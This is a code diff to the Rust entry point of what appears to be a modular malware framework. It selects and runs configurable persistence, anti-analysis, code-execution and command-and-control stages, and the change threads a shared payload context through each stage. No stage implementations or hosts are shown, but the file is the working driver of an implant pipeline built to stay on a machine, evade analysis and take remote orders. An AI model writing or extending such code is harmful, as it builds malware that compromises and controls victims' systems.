@@ -10,6 +10,12 @@ fn main() {
         .and_then(|content| toml::from_str(&content).ok());
     println!("Loaded config: {:?}", config);
 
+    // Create a StageContext instance
+    let ctx = pmsf::StageContext {
+        payload: None,
+        metadata: std::collections::HashMap::new(),
+    };
+
     // Helper closures for selecting implementations by name
     fn select_persistence(name: &str) -> Box<dyn pmsf::PersistenceStage> {
         match name {
@@ -51,26 +57,26 @@ fn main() {
         .map(select_persistence)
         .unwrap_or_else(establish_persistence_poly);
     println!("Selected persistence: {}", std::any::type_name_of_val(&*persistence));
-    persistence.establish_persistence().unwrap();
+    persistence.establish_persistence(&ctx).unwrap();
 
     let anti_analysis = config.as_ref()
         .and_then(|c| c.anti_analysis.as_deref())
         .map(select_anti_analysis)
         .unwrap_or_else(perform_anti_analysis_poly);
     println!("Selected anti-analysis: {}", std::any::type_name_of_val(&*anti_analysis));
-    anti_analysis.perform_anti_analysis().unwrap();
+    anti_analysis.perform_anti_analysis(&ctx).unwrap();
 
     let execution = config.as_ref()
         .and_then(|c| c.execution.as_deref())
         .map(select_execution)
         .unwrap_or_else(execute_code_poly);
     println!("Selected execution: {}", std::any::type_name_of_val(&*execution));
-    execution.execute_code().unwrap();
+    execution.execute_code(&ctx).unwrap();
 
     let c2 = config.as_ref()
         .and_then(|c| c.c2.as_deref())
         .map(select_c2)
         .unwrap_or_else(communicate_c2_poly);
     println!("Selected C2: {}", std::any::type_name_of_val(&*c2));
-    c2.communicate_c2().unwrap();
+    c2.communicate_c2(&ctx).unwrap();
 } 
